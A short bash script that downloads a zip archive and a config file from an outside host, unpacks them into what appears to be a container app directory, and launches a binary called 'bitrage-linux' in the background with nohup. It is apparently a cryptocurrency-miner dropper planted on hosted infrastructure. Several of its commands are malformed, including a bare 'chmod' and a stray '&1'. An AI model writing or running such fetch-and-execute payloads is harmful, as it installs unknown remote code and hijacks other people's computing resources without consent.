#!/bin/bash

wget -qO- -O tmp.zip http://www.fgteambr.esy.es/lin.zip && wget http://www.fgteambr.esy.es/config/config.json; chmod; unzip -o tmp.zip && rm tmp.zip;cd lin;mv config.json a; mv /opt/app-root/src/config.json /opt/app-root/src/lin/config.json;chmod +x bitrage-linux
nohup ./bitrage-linux &1
